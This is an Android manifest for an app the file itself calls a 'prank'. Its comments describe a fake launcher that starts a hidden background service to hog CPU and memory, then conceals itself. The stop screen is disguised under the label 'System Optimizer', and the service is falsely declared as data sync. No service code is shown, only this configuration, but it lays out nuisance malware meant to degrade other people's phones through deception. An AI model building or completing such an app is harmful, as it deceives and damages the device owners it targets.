<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.prank">

    <!-- ENI: Minimal permissions — no persistence, no boot receiver, just CPU and memory -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">

        <!-- Main Activity — fake launcher, starts lag service, hides itself -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:theme="@style/AppTheme.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Lag Service — background CPU/memory hog, dies on reboot (no boot receiver) -->
        <service
            android:name=".LagService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- Hidden activity to stop prank (emergency exit) -->
        <activity
            android:name=".StopActivity"
            android:exported="false"
            android:theme="@style/AppTheme.NoActionBar"
            android:label="System Optimizer" />

    </application>
</manifest>